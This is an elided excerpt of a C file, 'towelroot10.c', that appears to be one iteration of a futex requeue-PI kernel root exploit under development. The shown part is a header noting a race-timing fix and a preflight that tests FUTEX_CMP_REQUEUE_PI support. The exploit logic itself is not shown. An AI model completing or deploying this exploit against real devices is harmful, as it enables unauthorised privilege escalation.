/*
 * towelroot10.c — Diagnostic build: raw futex return values
 *
 ...
 *
 * FIXES over towelroot8:
 *
 *   BUG — sched_yield() in victim's round-wait loop causes 0% hits:
...
int main(void) {
    ...
    /* Test CMP_REQUEUE_PI support (call on empty futex — should return 0, not ENOSYS) */
    {
        int f1 = 0, f2 = 0;
        /* LOCK_PI(f2) first so CMP_REQUEUE_PI has somewhere to requeue to */
        syscall(SYS_futex, &f2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
        int rq = (int)syscall(SYS_futex, &f1, FUTEX_CMP_REQUEUE_PI, 0,
                               (void *)(intptr_t)1, (void *)&f2, 0);
        int rq_errno = errno;
        syscall(SYS_futex, &f2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[*] CMP_REQUEUE_PI preflight: rq=%d errno=%d (0,ENOSYS→not supported; 0,0→OK no waiters)\n",
               rq, (rq < 0) ? rq_errno : 0);
        fflush(stdout);
        if (rq < 0 && rq_errno == ENOSYS) {
            fprintf(stderr, "[-] FUTEX_CMP_REQUEUE_PI not supported on this kernel!\n");
            return 1;
        }
    }
